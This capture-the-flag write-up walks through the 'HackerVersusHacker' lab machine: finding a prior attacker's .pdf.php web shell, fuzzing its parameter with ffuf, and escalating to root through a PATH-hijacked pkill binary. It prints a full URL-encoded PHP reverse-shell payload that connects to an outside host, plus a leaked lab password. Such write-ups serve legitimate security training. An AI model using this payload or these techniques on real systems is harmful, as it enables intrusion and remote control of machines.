HackerVersusHacker

Target IP: 10.10.47.89

Someone has compromised this server already! Can you get in and evade their countermeasures?
The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?

Scanning


There are two TCP ports open on the target machine: SSH and HTTP. I will start enumeration with the HTTP application on port 80.

Enumeration

Port 80: HTTP


The webpage above is displayed for this web application.


Viewing the source-code of this webpage shows the interesting HTML comments above at line 61 and 72.


The upload.php contains the code above. There are interesting stuff here. All uploaded items are located at cvs/ directory. The filtering checks if the file name contains .pdf. But all of this has been commented out by the hacker, so the code above does not work.


And the feature to upload CV is shown above. What if the hacker uploaded a shell and I can access it using directory search?


And I found it! It looks like the hacker bypassed this filtering by the use of double extension of .pdf.php.

Exploitation


Now I have access to the hacker's uploaded web-shell, as shown above.


Doing a parameter fuzzing using ffuf with the command ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.47.89/cvs/shell.pdf.php?FUZZ=ls -fs 18 shows cmd is used as the parameter name.


And it is working! I can perform RCE using the parameter cmd. Time to gain a reverse shell connection using this shell.


I gained a reverse shell connection using the PHP payload below. It looks like the hacker does not like it when I upgrade my shell to a Python interactive shell. Now I have a foothold on the target machine.
PHP payload used: php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
Full URL with payload: http://10.10.47.89/cvs/shell.pdf.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Privilege Escalation


The .bash_history of user lachlan is readable. It contains the content above. It actually contains the password thisistheway123.


Spraying this password against lachlan works. Now I have escalated my privileges to the user lachlan.



The persistence script is responsible for killing our Python interactive shell and terminating SSH. However, it is run as root!


The path has a weakness too as /home/lachlan/bin is first. If I login to SSH as lachlan, I can create a malicious binary called pkill to setup a reverse shell connection.


Creating the malicious pkill binary for the reverse shell connection to my local machine on port 8444.


And listening on port 8444, I got a root reverse shell connection.
